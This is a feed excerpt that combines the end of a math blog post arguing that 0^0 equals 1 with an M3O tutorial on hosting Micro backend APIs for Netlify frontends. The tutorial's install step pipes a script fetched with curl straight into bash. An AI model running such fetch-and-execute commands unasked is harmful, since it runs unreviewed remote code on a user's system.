<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle scriptlevel="0" displaystyle="true"><mi>S</mi><mo stretchy="false">(</mo><msup><mi>p</mi><mi>α</mi></msup><mo stretchy="false">)</mo><mo>=</mo><mi>μ</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo><mo>+</mo><mi>μ</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mo>+</mo><mi>μ</mi><mo stretchy="false">(</mo><msup><mi>p</mi><mn>2</mn></msup><mo stretchy="false">)</mo><mo>+</mo><mo>…</mo><mo>+</mo><mi>μ</mi><mo stretchy="false">(</mo><msup><mi>p</mi><mi>α</mi></msup><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn><mo>−</mo><mn>1</mn><mo>+</mo><mn>0</mn><mo>+</mo><mo>…</mo><mo>+</mo><mn>0</mn><mo>=</mo><mn>0</mn></mstyle></mrow><annotation encoding="application/x-tex">\displaystyle 
S(p^\alpha) = \mu(1) + \mu(p) + \mu(p^2) + \ldots + \mu(p^\alpha) = 1 - 1 + 0 + \ldots + 0 = 0
</annotation></semantics></math></span></span></p>

<p>Let’s factor n into prime numbers:</p>
<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle scriptlevel="0" displaystyle="true"><mi>n</mi><mo>=</mo><munderover><mo>∏</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>k</mi></munderover><msubsup><mi>p</mi><mi>i</mi><msub><mi>α</mi><mi>i</mi></msub></msubsup></mstyle></mrow><annotation encoding="application/x-tex">\displaystyle 
n = \prod_{i=1}^{k} p_i^{\alpha_i}
</annotation></semantics></math></span></span></p>

<p>and then we have:</p>
<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle scriptlevel="0" displaystyle="true"><mtable rowspacing="0.24999999999999992em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>S</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mi>S</mi><mrow><mo fence="true">(</mo><munderover><mo>∏</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>k</mi></munderover><msubsup><mi>p</mi><mi>i</mi><msub><mi>α</mi><mi>i</mi></msub></msubsup><mo fence="true">)</mo></mrow><mo>=</mo><munderover><mo>∏</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>k</mi></munderover><mi>S</mi><mo stretchy="false">(</mo><msubsup><mi>p</mi><mi>i</mi><msub><mi>α</mi><mi>i</mi></msub></msubsup><mo stretchy="false">)</mo><mo>=</mo><munderover><mo>∏</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>k</mi></munderover><mn>0</mn><mo>=</mo><msup><mn>0</mn><mi>k</mi></msup><mo>=</mo><mo stretchy="false">[</mo><mi>k</mi><mo>=</mo><mn>0</mn><mo stretchy="false">]</mo><mo>=</mo><mo stretchy="false">[</mo><mi>n</mi><mo>=</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.3599999999999999em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>if&nbsp;</mtext><mi>n</mi><mo>=</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>if&nbsp;</mtext><mi>n</mi><mo>&gt;</mo><mn>1</mn></mrow></mstyle></mtd></mtr></mtable></mrow></mrow></mstyle></mtd></mtr></mtable></mstyle></mrow><annotation encoding="application/x-tex">\displaystyle 
\begin{aligned}
S(n) &amp;= S\left(\prod_{i=1}^{k} p_i^{\alpha_i}\right) = \prod_{i=1}^k S(p_i^{\alpha_i}) = \prod_{i=1}^k 0 = 0^k
= [k=0] = [n=1] \\
&amp;= \begin{cases}
1 &amp;\text{if } n = 1 \\
0 &amp;\text{if } n &gt; 1
\end{cases}
\end{aligned}
</annotation></semantics></math></span></span></p>

<h2 id="fractional-exponents">Fractional exponents</h2>

<p>What about the 0<sup>x</sup> function for <strong>real</strong> (rather than natural) exponents <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>≥</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">x \ge 0</annotation></semantics></math></span></span>?</p>

<p>Some people argue that while the case for 0<sup>n</sup>=[n=0] is convincing, the case for 0<sup>x</sup>=[x=0]
is less convincing, and 0<sup>0</sup> should only be defined for the integral exponent 0, and left undefined
for the real exponent 0.0.</p>

<p>I have three ways to answer that.</p>

<h3 id="natural-numbers-are-real-numbers">Natural numbers are real numbers</h3>

<p>A ubiquitous convention in mathematics is that natural numbers are a subset of integer
numbers, which in turn are a subset of rational numbers, which are a subset of real numbers.</p>

<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle scriptlevel="0" displaystyle="true"><mi mathvariant="double-struck">N</mi><mo>⊂</mo><mi mathvariant="double-struck">Z</mi><mo>⊂</mo><mi mathvariant="double-struck">Q</mi><mo>⊂</mo><mi mathvariant="double-struck">R</mi></mstyle></mrow><annotation encoding="application/x-tex">\displaystyle 
\mathbb{N} \subset \mathbb{Z} \subset \mathbb{Q} \subset \mathbb{R}
</annotation></semantics></math></span></span></p>

<p>This lets us mix and match integers with rational numbers and irrational numbers in expressions
without having to worry about converting between these types.</p>

<p>If so, it makes no sense to say that 0<sup>0</sup>=1 but 0<sup>0.0</sup> is undefined, because
the natural number 0 is the same number as the real number 0.0.</p>

<p>One reason to doubt this is how numbers are constructed from sets in set theory. Natural numbers
are constructed first. Then integers are constructed as equivalence classes of pairs of natural numbers.
Similarly rational numbers are then constructed as equivalence classes of pairs of integers. Finally real
numbers are constructed from rational numbers using Dedekind cuts or Cauchy sequences.</p>

<p>If we literally follow such a construction, then indeed the natural number 0, the integer 0,
the rational number 0, and the real number 0 will be four different objects. However, there is
an easy fix. When constructing integers as certain equivalence classes of pairs of natural numbers,
we can simply replace the non-negative integers with the actual natural numbers. Similarly, we can
replace the “integral rationals” with actual integers, and “rational reals” with the actual rationals.
After we do that, the 0 number is the same object belonging to all four sets.</p>

<h3 id="consistency-is-good">Consistency is good</h3>

<p>Even if one were to treat integers as disjoint from reals, it would be nice to know that if
the notation a<sup>b</sup> means something for integers a and b, then it also means the equivalent
thing for the real equivalents of a and b. Technically what it means is that it would be nice if the integer-to-real
mapping was a homomorphism for the a<sup>b</sup> operation.</p>

<p>Otherwise, if the notation changed meaning between the “integer context” and “real context”, we would have to be
extremely careful about which context we are in! And it wouldn’t be clear from notation such as
x<sup>0</sup>. It would be a mess. We don’t want notation to be ambiguous.</p>

<h3 id="0x-is-sometimes-useful-for-fractional-exponents">0<sup>x</sup> is sometimes useful for fractional exponents</h3>

<p>What is the (right-sided) derivative of <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>x</mi><mi>p</mi></msup></mrow><annotation encoding="application/x-tex">x^p</annotation></semantics></math></span></span> at x = 0 for <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo>≥</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">p\ge 1</annotation></semantics></math></span></span>?
Let’s calculate:</p>

<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle scriptlevel="0" displaystyle="true"><mtable rowspacing="0.24999999999999992em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><msub><mrow><mrow><mfrac><mi>d</mi><mrow><mi>d</mi><mi>x</mi></mrow></mfrac><msup><mi>x</mi><mi>p</mi></msup></mrow><mo fence="true">∣</mo></mrow><mrow><mi>x</mi><mo>=</mo><mn>0</mn></mrow></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><msub><mrow><mrow><mi>p</mi><msup><mi>x</mi><mrow><mi>p</mi><mo>−</mo><mn>1</mn></mrow></msup></mrow><mo fence="true">∣</mo></mrow><mrow><mi>x</mi><mo>=</mo><mn>0</mn></mrow></msub><mo>=</mo><mi>p</mi><mo>⋅</mo><msup><mn>0</mn><mrow><mi>p</mi><mo>−</mo><mn>1</mn></mrow></msup><mo>=</mo><mi>p</mi><mo stretchy="false">[</mo><mi>p</mi><mo>=</mo><mn>1</mn><mo stretchy="false">]</mo><mo>=</mo><mo stretchy="false">[</mo><mi>p</mi><mo>=</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.3599999999999999em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>if&nbsp;</mtext><mi>p</mi><mo>=</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>if&nbsp;</mtext><mi>p</mi><mo>&gt;</mo><mn>1</mn></mrow></mstyle></mtd></mtr></mtable></mrow></mrow></mstyle></mtd></mtr></mtable></mstyle></mrow><annotation encoding="application/x-tex">\displaystyle 
\begin{aligned}
\left.{\frac{d}{dx}x^p}\right\vert_{x=0} &amp;= \left.{p x^{p-1}}\right\vert_{x=0} = p\cdot 0^{p-1} = p[p=1] = [p=1] \\
&amp;= \begin{cases}
1 &amp;\text{if } p = 1 \\
0 &amp;\text{if } p &gt; 1
\end{cases}
\end{aligned}
</annotation></semantics></math></span></span></p>

<p>And indeed this is correct! The derivative at x = 0 is 1 for p = 1, and 0 for p &gt; 1. The derivative
at 0 discontinuously “jumps” from 1 to 0 as soon as we increase the exponent p even slightly above 1.</p>

<h2 id="the-naive-limit-algorithm">The naive limit algorithm</h2>

<p>Given all these nice uses of 0<sup>0</sup> = 1, why do some people resist defining it like this?</p>

<p>The only reason I have seen has to do with what I call the “naive limit algorithm”.</p>

<p>Suppose we want to calculate this limit:</p>
<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle scriptlevel="0" displaystyle="true"><munder><mo><mi>lim</mi><mo>⁡</mo></mo><mrow><mi>n</mi><mo>→</mo><mi mathvariant="normal">∞</mi></mrow></munder><msup><mrow><mo fence="true">(</mo><msup><mi>n</mi><mn>2</mn></msup><msup><mn>3</mn><mrow><mo>−</mo><mi>n</mi></mrow></msup><mo fence="true">)</mo></mrow><mrow><mn>1</mn><mi mathvariant="normal">/</mi><mi>n</mi></mrow></msup></mstyle></mrow><annotation encoding="application/x-tex">\displaystyle 
\lim_{n\to\infty} \left(n^2 3^{-n}\right)^{1/n}
</annotation></semantics></math></span></span></p>

<p>The argument goes that somebody could calculate it like this:</p>
<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle scriptlevel="0" displaystyle="true"><munder><mo><mi>lim</mi><mo>⁡</mo></mo><mrow><mi>n</mi><mo>→</mo><mi mathvariant="normal">∞</mi></mrow></munder><msup><mi>n</mi><mn>2</mn></msup><msup><mn>3</mn><mrow><mo>−</mo><mi>n</mi></mrow></msup><mo>=</mo><mn>0</mn><mspace linebreak="newline"></mspace><munder><mo><mi>lim</mi><mo>⁡</mo></mo><mrow><mi>n</mi><mo>→</mo><mi mathvariant="normal">∞</mi></mrow></munder><mfrac><mn>1</mn><mi>n</mi></mfrac><mo>=</mo><mn>0</mn><mspace linebreak="newline"></mspace><munder><mo><mi>lim</mi><mo>⁡</mo></mo><mrow><mi>n</mi><mo>→</mo><mi mathvariant="normal">∞</mi></mrow></munder><msup><mrow><mo fence="true">(</mo><msup><mi>n</mi><mn>2</mn></msup><msup><mn>3</mn><mrow><mo>−</mo><mi>n</mi></mrow></msup><mo fence="true">)</mo></mrow><mrow><mn>1</mn><mi mathvariant="normal">/</mi><mi>n</mi></mrow></msup><mo>=</mo><msup><mn>0</mn><mn>0</mn></msup><mo>=</mo><mn>1</mn></mstyle></mrow><annotation encoding="application/x-tex">\displaystyle 
\lim_{n\to\infty} n^2 3^{-n} = 0 \\
\lim_{n\to\infty} \frac{1}{n} = 0 \\
\lim_{n\to\infty} \left(n^2 3^{-n}\right)^{1/n} = 0^0 = 1
</annotation></semantics></math></span></span></p>

<p>Which would give an incorrect answer. The correct answer is 1/3.</p>

<p>However, the mistake is not in the step 0<sup>0</sup> = 1. The mistake already happened in the
previous step, where we simplified the limit to 0<sup>0</sup>.</p>

<p>A common (incorrect) way of thinking about this is: we allow calculating limits separately for
sub-expressions only if the resulting expression makes sense.
If it does not make sense, then doing that is not allowed. If only we declare that 0<sup>0</sup> is not a valid
expression, the reduction to 0<sup>0</sup> will not be allowed, so it solves the problem. If however
we do define 0<sup>0</sup> to mean something, the reduction would be allowed.</p>

<p>That’s what I call the “naive limit algorithm”. It doesn’t work.</p>

<p>Let’s apply the same algorithm to a different limit:</p>
<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle scriptlevel="0" displaystyle="true"><munder><mo><mi>lim</mi><mo>⁡</mo></mo><mrow><mi>n</mi><mo>→</mo><mi mathvariant="normal">∞</mi></mrow></munder><mn>10</mn><mo>+</mo><mfrac><mn>1</mn><mi>n</mi></mfrac><mo>=</mo><mn>10</mn><mspace linebreak="newline"></mspace><munder><mo><mi>lim</mi><mo>⁡</mo></mo><mrow><mi>n</mi><mo>→</mo><mi mathvariant="normal">∞</mi></mrow></munder><mrow><mo fence="true">⌈</mo><mrow><mn>10</mn><mo>+</mo><mfrac><mn>1</mn><mi>n</mi></mfrac></mrow><mo fence="true">⌉</mo></mrow><mo>=</mo><mo stretchy="false">⌈</mo><mn>10</mn><mo stretchy="false">⌉</mo><mo>=</mo><mn>10</mn></mstyle></mrow><annotation encoding="application/x-tex">\displaystyle 
\lim_{n\to\infty} 10 + \frac{1}{n} = 10 \\
\lim_{n\to\infty} \left\lceil{10 + \frac{1}{n}}\right\rceil = \lceil 10 \rceil = 10
</annotation></semantics></math></span></span></p>

<p>There is an error here. The correct value of the last limit is not 10, it is 11. But this time we can’t fix it the same
way: we can’t say “let’s just leave <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">⌈</mo><mn>10</mn><mo stretchy="false">⌉</mo></mrow><annotation encoding="application/x-tex">\lceil 10 \rceil</annotation></semantics></math></span></span> undefined”.
Everybody agrees that is a valid expression and has to be defined!</p>

<p>The naive limit algorithm simply doesn’t always work.</p>

<p>In general, the algorithm can be described as follows. If:</p>
<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle scriptlevel="0" displaystyle="true"><munder><mo><mi>lim</mi><mo>⁡</mo></mo><mrow><mi>n</mi><mo>→</mo><mi mathvariant="normal">∞</mi></mrow></munder><msub><mi>a</mi><mi>n</mi></msub><mo>=</mo><mi>a</mi><mspace linebreak="newline"></mspace><munder><mo><mi>lim</mi><mo>⁡</mo></mo><mrow><mi>n</mi><mo>→</mo><mi mathvariant="normal">∞</mi></mrow></munder><msub><mi>b</mi><mi>n</mi></msub><mo>=</mo><mi>b</mi><mspace linebreak="newline"></mspace><munder><mo><mi>lim</mi><mo>⁡</mo></mo><mrow><mi>n</mi><mo>→</mo><mi mathvariant="normal">∞</mi></mrow></munder><msub><mi>c</mi><mi>n</mi></msub><mo>=</mo><mi>c</mi><mspace linebreak="newline"></mspace><mo>…</mo></mstyle></mrow><annotation encoding="application/x-tex">\displaystyle 
\lim_{n\to\infty} a_n = a \\
\lim_{n\to\infty} b_n = b \\
\lim_{n\to\infty} c_n = c \\
\ldots
</annotation></semantics></math></span></span></p>
<p>and <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo separator="true">,</mo><mi>c</mi><mo separator="true">,</mo><mo>…</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(a, b, c, \ldots) </annotation></semantics></math></span></span> is a valid expression, then:</p>

<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle scriptlevel="0" displaystyle="true"><munder><mo><mi>lim</mi><mo>⁡</mo></mo><mrow><mi>n</mi><mo>→</mo><mi mathvariant="normal">∞</mi></mrow></munder><mi>f</mi><mo stretchy="false">(</mo><msub><mi>a</mi><mi>n</mi></msub><mo separator="true">,</mo><msub><mi>b</mi><mi>n</mi></msub><mo separator="true">,</mo><msub><mi>c</mi><mi>n</mi></msub><mo separator="true">,</mo><mo>…</mo><mo stretchy="false">)</mo><mo>=</mo><mi>f</mi><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo separator="true">,</mo><mi>c</mi><mo separator="true">,</mo><mo>…</mo><mo stretchy="false">)</mo></mstyle></mrow><annotation encoding="application/x-tex">\displaystyle 
\lim_{n\to\infty} f(a_n, b_n, c_n, \ldots) = f(a, b, c, \ldots)
</annotation></semantics></math></span></span></p>

<p>Is this true? It’s not always true! What we wrote here is precisely the definition of continuity
of f at the point (a, b, c, …). Some functions are not continuous!</p>

<p>Therefore the appropriate condition shouldn’t have been “<span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo separator="true">,</mo><mi>c</mi><mo separator="true">,</mo><mo>…</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(a, b, c, \ldots) </annotation></semantics></math></span></span> is a valid expression”, it should have been “f is continuous at (a, b, c, …)”.</p>

<p>Well, x<sup>y</sup> is simply not continuous at (0, 0). As we saw, even 0<sup>x</sup>
is not continuous at 0. It’s inherently so, it reflects deep mathematical reality.</p>

<p>Refusing to define the operation there doesn’t
really help the situation at all. If we don’t define it at (0, 0), it’s still not going to be continuous there,
 it would not even be defined there, which is worse! We can’t use the naive limit algorithm at that point either way.</p>

<h2 id="conclusion">Conclusion</h2>

<p>I think we should just all agree that:</p>
<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle scriptlevel="0" displaystyle="true"><msup><mn>0</mn><mn>0</mn></msup><mo>=</mo><mn>1</mn></mstyle></mrow><annotation encoding="application/x-tex">\displaystyle 
0^0 = 1
</annotation></semantics></math></span></span></p>

<p>It follows directly from definitions, and it’s a nice and consistent and useful property
of exponentiation. There is no convincing reason to make an exception.</p>

<p>Let me know what you think!</p>

  </div>
  
  
</article>

      </div>
    </div></div>]]>
            </description>
            <link>https://sortingsearching.com/2020/11/11/zero-power-zero.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25068785</guid>
            <pubDate>Thu, 12 Nov 2020 11:44:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Netlify for the frontend, Micro for the backend]]>
            </title>
            <description>
<![CDATA[
Score 137 | Comments 59 (<a href="https://news.ycombinator.com/item?id=25068782">thread link</a>) | @chuhnk
<br/>
November 12, 2020 | https://blog.m3o.com/2020/11/12/netlify-for-the-frontend-micro-for-the-backend.html | <a href="https://web.archive.org/web/*/https://blog.m3o.com/2020/11/12/netlify-for-the-frontend-micro-for-the-backend.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">

    <article>

        

<!--         <header class="post-header">
            <a id="blog-logo" href="">
                
                    <span class="blog-title">M3O</span>
                
            </a>
        </header> -->

        <!-- <span class="post-meta">
            <time datetime="2020-11-12">12 Nov 2020</time>
            
        </span> -->

        <!-- <h1 class="post-title">Netlify for the frontend, Micro for the backend</h1> -->

        <section>
            <p><br>
Today Netlify has emerged as the modern platform for rapidly building web applications without having to worry about anything beyond your code. We at <a href="https://m3o.com/">Micro</a>
are users of Netlify and have bought into this phenomenal experience. What’s more Netlify has demonstrated to us a breakdown in the classic web architecture 
stack which previously combined web and api concerns in a single place. As we moved through a tiered architecture frontend had not been given anything more 
than hints on how to consume dynamic content from the backend. Today we’re all calling this the <a href="https://jamstack.org/">Jamstack</a>.</p>

<h2 id="jamstack">Jamstack</h2>

<p><img src="https://d33wubrfki0l68.cloudfront.net/b7d16f7f3654fb8572360301e60d76df254a323e/385ec/img/svg/architecture.svg"></p>
<center><i><small>Credit jamstack.org</small></i></center>
<p><br>
The jamstack rethinks the frontend architecture by separating the concerns of static and dynamic content and pushing for the dynamic side to be consumed 
through APIs and services. Effectively, Netlify embracing this model has tried to build microservices for the frontend and moved towards a unification 
of consumption of services via APIs on the backend. It’s clear this is the architecture of the future for the web and the majority of cloud services 
will be built and consumed soley as APIs.</p>

<p>The one question we’ve really been seeing a lot though is “What’s Netlify for the backend?”. Many of those frontend users building Jamstack apps on 
Netlify are looking to where they can find and build these APIs. It seems even Netlify’s current answer has been, “go host something on heroku”. I think 
in 2020 this just doesn’t fly. If the frontend is being reimagined then the same has to happen on the backend to cater for that use.</p>

<h2 id="netlify-for-the-backend">Netlify for the Backend</h2>

<p><img src="https://blog.m3o.com/assets/images/netlify.png"></p>

<p><a href="https://m3o.com/"><strong>M3O</strong></a> is a platform for cloud services development. The fastest way to build APIs without managing the infrastructure. M3O makes use of 
<a href="https://micro.mu/"><strong>Micro</strong></a>, an open source platform for microservices development. What we get from Micro is a powerful framework for building, running 
and consuming APIs as microservices. What M3O brings to the table is Micro as a Service, a fully managed platform for building microservices. Write services 
in Go and gRPC on the backend, expose them dynamically via HTTP API to be consumed by the frontend. M3O looks to fill that gap in the market for frontend 
devs. M3O is Netlify for the backend.</p>

<h2 id="m3o-features">M3O Features</h2>

<p>As we mentioned, M3O is a fully managed <a href="https://micro.mu/">Micro</a> services platform. What does that mean? Micro provides the building blocks for 
writing, running and consuming microservices. From source to running and beyond. M3O takes that and hosts it so you can just get on with writing 
APIs without worrying about the underlying infrastructure.</p>

<p>Here’s a few of the key features and services:</p>

<ul>
  <li><strong>Microservices development</strong> using <a href="https://grpc.io/">gRPC</a> and protobuf code generation</li>
  <li><strong>Service runtime</strong> and process lifecycle management</li>
  <li><strong>Source to running</strong> builds without need for CI/CD</li>
  <li><strong>Authentication and authorization</strong> for access control and user management</li>
  <li><strong>Dynamic configuration</strong> and secrets management</li>
  <li><strong>PubSub messaging</strong> and event streaming</li>
  <li><strong>Service discovery</strong> and secure networking</li>
  <li><strong>Key-value storage</strong> and persistent CRUD</li>
  <li><strong>Automatic HTTP routing</strong> with path based resolution</li>
  <li><strong>Identity aware proxy</strong> for remote access and gRPC-web apps</li>
  <li><strong>Public API gateway</strong> and TLS support by default</li>
  <li><strong>Public and private repos</strong> support including  github, gitlab and bitbucket</li>
</ul>

<p>M3O is a feature complete platform for microservices development from generating service templates on your local machine through to writing and running 
it in the cloud all using the same Micro CLI experience. M3O exposes HTTPS urls for you dynamically by default. So every service automatically becomes 
an API as soon as you deploy it.</p>

<p>Where a new development model has emerged for the frontend, we think its dictating the “headless” paradigm shift for the backend and M3O wants to be there 
to host all of those APIs as Micro services.</p>

<h2 id="api-first">API First</h2>

<p><img src="https://dev-to-uploads.s3.amazonaws.com/i/0znow24kgpu2dp3zg60n.png"></p>

<p>We are seeing the emergence of APIs as the dominant form factor for cloud services, from AWS all the way through to Twilio and Stripe. What’s even more 
compelling is while this model has emerged in the past few years, we are only really just getting started. It’s our belief that in a decade from now 
some of the most important companies will be API first yet strangely there is no platform to caters to this form of development.</p>

<p>Twilio, Stripe and others have all had to build out the infrastructure for their API first approach. We think as many more companies go down this path 
the tools must emerge to empower them, not just at the compute layer but by providing the higher level abstractions required. That’s the goal of M3O.</p>

<p>But don’t just take our word for it. We’re going to walk you through a demonstration of the value proposition so you can see for yourself just how 
powerful Micro and M3O are.</p>

<h2 id="building-a-backend">Building a backend</h2>

<p>You’re going to be writing and deploying APIs in minutes rather than hours or days! No more dealing with infrastructure on the 
backend, just as Netlify empowered devs on the frontend, we’re doing the same for a new generation of developers on the backend.</p>

<p>Let’s walk you through it. We’ll deploy an existing Micro blog service with this demo frontend on Netlify: <a href="https://loving-goodall-44ee08.netlify.app/">https://loving-goodall-44ee08.netlify.app/</a>. But first let’s start with signup.</p>

<h3 id="signup-to-m3o">Signup to M3O</h3>

<p>First you start by signing up to M3O and registering for a free account in our Dev environment.</p>

<p>Start by installing micro</p>

<div><div><pre><code>curl <span>-fsSL</span> https://install.m3o.com/micro | /bin/bash
</code></pre></div></div>

<p>For those wary of curl into bash, you can view it first <a href="https://install.m3o.com/micro">https://install.m3o.com/micro</a>.</p>

<p>Signup is purely CLI based for now so just issue the following command and follow the steps</p>



<p>Once you’re done you should have an account on M3O and be automatically logged in.</p>

<h3 id="run-helloworld">Run Helloworld</h3>

<p>Validate that by running helloworld.</p>

<div><div><pre><code>micro run github.com/micro/services/helloworld
</code></pre></div></div>

<p>Check it’s running and try call it via the CLI.</p>

<div><div><pre><code><span># check the status</span>
micro status

<span># call helloworld</span>
micro call helloworld <span>--name</span><span>=</span><span>"Alice"</span>
</code></pre></div></div>

<p>OK now we get to the more interesting part. Call it via the HTTP API that’s dynamically generated for you.</p>

<div><div><pre><code><span># get your namespace</span>
<span>NAMESPACE</span><span>=</span><span>$(</span>micro user namespace<span>)</span>

<span># curl your unique url</span>
curl <span>"https://</span><span>$NAMESPACE</span><span>.m3o.com/helloworld?name=Alice"</span>
</code></pre></div></div>

<p>If alls good, we can move on to running something a bit more interesting.</p>

<h3 id="deploying-a-dynamic-blog-backend">Deploying a dynamic blog backend</h3>

<p>We’re going to deploy a headless CMS, or better known as a Blog API.</p>

<p>On the open source side, Micro maintains some reusable example services we can all play with and contribute back to. 
You can check them out at <a href="https://github.com/micro/services">github.com/micro/services</a>. Let’s bootstrap the blog 
using a couple of them.</p>

<p>Because Micro is all about microservices development, we’ve decomposed the blog API into posts, comments and tags. 
Right now we’ll focus on posts and tags. You can find the code in <a href="https://github.com/micro/services/tree/master/blog">https://github.com/micro/services/tree/master/blog</a>.</p>

<p>Deploying these is super simple.</p>

<div><div><pre><code><span># run the posts service</span>
micro run github.com/micro/services/blog/posts

<span># run the tags service</span>
micro run github.com/micro/services/blog/tags
</code></pre></div></div>

<p>Check they’re running using <code>micro status</code>. You should see the status progress through starting, building and running. 
If you want to see logs or anything related just do <code>micro logs posts</code> and the same for any other service by name.</p>

<h3 id="write-a-post-on-the-cli">Write a post on the CLI</h3>

<p>Once services are running they become immediately callable via the CLI as dynamic commands.</p>

<p>Save a quick post:</p>

<div><div><pre><code>micro posts save <span>--id</span><span>=</span>1 <span>--title</span><span>=</span><span>"My first post"</span> <span>--content</span><span>=</span><span>"This is pretty epic"</span>
</code></pre></div></div>

<p>List posts:</p>



<p>The same calls can be made over the API too, just have to know your namespace:</p>

<h3 id="call-it-via-the-http-api">Call it via the HTTP API</h3>

<p>Now here’s where it gets cool and more importantly what you’ll be calling from your frontend apps 
running on Netlify. First grab your namespace like earlier.</p>

<div><div><pre><code><span>$ </span>micro user namespace
random-example-namespace
</code></pre></div></div>

<p>Now just curl it like any other api</p>

<div><div><pre><code><span>$ </span>curl <span>-H</span> <span>"Micro-Namespace: random-example-namespace"</span> https://api.m3o.dev/posts/query
<span>{</span>
  <span>"posts"</span>: <span>[</span>
    <span>{</span>
      <span>"id"</span>: <span>"1"</span>,
      <span>"title"</span>: <span>"My first post"</span>,
      <span>"slug"</span>: <span>"my-first-post"</span>,
      <span>"content"</span>: <span>"This is pretty epic"</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>The generic <code>api.m3o.dev</code> url requires us to pass in our namespace so we query our own service but 
every namespace also gets its own unique URL so you don’t have to worry about this in your frontend 
code. Just compose namespace + m3o.dev as <code>random-example-namespace.m3o.dev</code>.</p>

<div><div><pre><code><span>$ </span>curl https://random-example-namespace.m3o.dev/posts/query
<span>{</span>
  <span>"posts"</span>: <span>[</span>
    <span>{</span>
      <span>"id"</span>: <span>"1"</span>,
      <span>"title"</span>: <span>"My first post"</span>,
      <span>"slug"</span>: <span>"my-first-post"</span>,
      <span>"content"</span>: <span>"This is pretty epic"</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>That’s it! We now have the backend for our frontend running on M3O.</p>

<p>Let’s deploy the sample frontend to Netlify just for kicks.</p>

<h2 id="deploying-the-frontend-to-netlify">Deploying the frontend to Netlify</h2>

<p>The frontend is a simple angular app we’ve put together to validate the premise:</p>

<p><strong>Netlify for the frontend, Micro for the backend</strong></p>

<p>You can find the code in <a href="https://github.com/m3o/blog-frontend">github.com/m3o/blog-frontend</a> but 
we’ll walk you through the install now. The deploy settings for the site hosted under 
<a href="https://loving-goodall-44ee08.netlify.app/">loving-goodall-44ee08.netlify.app</a> are as follows:</p>

<h3 id="build-settings">Build settings</h3>

<center>
